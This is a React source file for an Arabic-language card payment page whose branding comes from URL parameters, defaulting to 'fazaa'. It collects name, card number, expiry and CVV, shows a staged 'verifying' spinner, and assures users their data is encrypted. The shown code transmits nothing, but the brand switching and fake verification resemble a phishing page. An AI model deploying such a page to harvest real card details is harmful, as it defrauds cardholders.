import React, { useState } from 'react';
import { useLocation, useSearch } from 'wouter';
import { BRANDS, type BrandKey, type CardTypeKey } from '@/data/brands';

/* ─── Loading Modal ─── */
function LoadingModal() {
  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center"
      style={{ background: 'rgba(0,0,0,0.55)', backdropFilter: 'blur(3px)' }}
    >
      <div
        className="mx-6 w-full max-w-[340px] rounded-2xl px-8 py-8 flex flex-col items-center gap-5"
        style={{ background: 'rgba(55,55,55,0.92)' }}
      >
        {/* Gold spinner */}
        <div
          className="w-14 h-14 rounded-full border-4 border-[#c9a227]/30 border-t-[#c9a227] animate-spin"
        />
        <p className="text-white text-center text-[15px] leading-relaxed">
          جاري التحقق من المعلومات، يرجى الانتظار…
        </p>
      </div>
    </div>
  );
}

/* ─── Brand logo block (top-right, changes per brand) ─── */
function BrandLogo({ brandKey }: { brandKey: BrandKey }) {
  const brand = BRANDS[brandKey] || BRANDS.fazaa;
  return (
    <div className="flex flex-col items-center">
      <div
        className="w-16 h-16 rounded-xl flex items-center justify-center text-white font-bold text-2xl shadow-sm mb-1"
        style={{ background: `linear-gradient(135deg, ${brand.darkColor}, ${brand.color})` }}
      >
        {brand.name.charAt(0)}
      </div>
      <span className="font-bold text-[13px] tracking-widest font-sans" style={{ color: brand.color }}>
        {brand.nameEn}
      </span>
    </div>
  );
}

export default function Payment() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);

  const brandKey = (params.get('brand') || 'fazaa') as BrandKey;
  const typeKey = (params.get('type') || 'gold') as CardTypeKey;

  const [holderName, setHolderName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [loading, setLoading] = useState(false);

  /* format card number into groups of 4 */
  const handleCardNumber = (v: string) => {
    const digits = v.replace(/\D/g, '').slice(0, 16);
    setCardNumber(digits.replace(/(.{4})/g, '$1 ').trim());
  };

  /* format MM/YY */
  const handleExpiry = (v: string) => {
    const digits = v.replace(/\D/g, '').slice(0, 4);
    if (digits.length >= 3) {
      setExpiry(digits.slice(0, 2) + '/' + digits.slice(2));
    } else {
      setExpiry(digits);
    }
  };

  const validate = () => {
    const e: Record<string, string> = {};
    if (!holderName.trim()) e.holderName = 'اسم حامل البطاقة مطلوب';
    if (cardNumber.replace(/\s/g, '').length < 16) e.cardNumber = 'رقم البطاقة غير صحيح';
    if (!/^\d{2}\/\d{2}$/.test(expiry)) e.expiry = 'تاريخ غير صحيح';
    if (cvv.length < 3) e.cvv = 'رمز غير صحيح';
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!validate()) return;

    setLoading(true);
    /* simulate verification then redirect to registration */
    setTimeout(() => {
      setLoading(false);
      setLocation(`/register?brand=${brandKey}&type=${typeKey}`);
    }, 2500);
  };

  const inputClass = (field: string) =>
    `w-full bg-white border ${errors[field] ? 'border-red-400' : 'border-gray-200'} rounded-xl px-4 py-3 text-right outline-none focus:border-[#c9a227] focus:ring-1 focus:ring-[#c9a227] transition-shadow text-gray-800 placeholder:text-gray-300`;

  return (
    <>
      {loading && <LoadingModal />}

      <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center py-10 px-4">
        <div className="w-full max-w-[480px] bg-white rounded-2xl shadow-md border border-gray-100 overflow-hidden">

          {/* logo header */}
          <div className="flex justify-end px-6 pt-7 pb-5 border-b border-gray-100">
            <BrandLogo brandKey={brandKey} />
          </div>

          <form onSubmit={handleSubmit} className="px-6 py-7 space-y-6" noValidate>

            {/* اسم حامل البطاقة */}
            <div className="space-y-1.5">
              <label className="block text-sm font-semibold text-gray-700 text-right">
                اسم حامل البطاقة
              </label>
              <input
                type="text"
                value={holderName}
                onChange={e => setHolderName(e.target.value)}
                placeholder="اسم حامل البطاقة"
                className={inputClass('holderName')}
              />
              {errors.holderName && <p className="text-xs text-red-500 text-right">{errors.holderName}</p>}
            </div>

            {/* رقم البطاقة */}
            <div className="space-y-1.5">
              <label className="block text-sm font-semibold text-gray-700 text-right">
                رقم البطاقة
              </label>
              <div className="relative">
                <input
                  type="text"
                  inputMode="numeric"
                  value={cardNumber}
                  onChange={e => handleCardNumber(e.target.value)}
                  placeholder="•••• •••• •••• ••••"
                  className={`${inputClass('cardNumber')} pl-12`}
                  dir="ltr"
                />
                {/* card icon */}
                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
                  <svg width="28" height="20" viewBox="0 0 28 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect width="28" height="20" rx="3" fill="#e5e7eb"/>
                    <rect y="5" width="28" height="5" fill="#9ca3af"/>
                    <rect x="3" y="13" width="7" height="3" rx="1" fill="#c9a227"/>
                  </svg>
                </div>
              </div>
              {errors.cardNumber && <p className="text-xs text-red-500 text-right">{errors.cardNumber}</p>}
            </div>

            {/* تاريخ الانتهاء + CVV */}
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-1.5">
                <label className="block text-sm font-semibold text-gray-700 text-right">
                  تاريخ الانتهاء
                </label>
                <input
                  type="text"
                  inputMode="numeric"
                  value={expiry}
                  onChange={e => handleExpiry(e.target.value)}
                  placeholder="MM/YY"
                  className={inputClass('expiry')}
                  dir="ltr"
                  maxLength={5}
                />
                {errors.expiry && <p className="text-xs text-red-500 text-right">{errors.expiry}</p>}
              </div>

              <div className="space-y-1.5">
                <label className="block text-sm font-semibold text-gray-700 text-right">
                  رمز الأمان (CVV)
                </label>
                <input
                  type="text"
                  inputMode="numeric"
                  value={cvv}
                  onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                  placeholder="•••"
                  className={inputClass('cvv')}
                  dir="ltr"
                  maxLength={4}
                />
                {errors.cvv && <p className="text-xs text-red-500 text-right">{errors.cvv}</p>}
              </div>
            </div>

            {/* security notice */}
            <div className="bg-[#f8f5eb] border border-[#e8d99a] rounded-xl px-4 py-3 flex items-start gap-3">
              <span className="text-xl mt-0.5 shrink-0">🔒</span>
              <p className="text-[13px] text-gray-600 text-right leading-relaxed">
                جميع المعلومات المالية محمية ومشفرة. لن يتم حفظ بيانات البطاقة على خوادمنا.
              </p>
            </div>

            {/* submit */}
            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#c9a227] hover:bg-[#b8943f] active:bg-[#a07c30] text-white font-bold text-[17px] py-4 rounded-xl transition-colors shadow-sm disabled:opacity-70 cursor-pointer"
            >
              التالي
            </button>
          </form>
        </div>
      </div>
    </>
  );
}
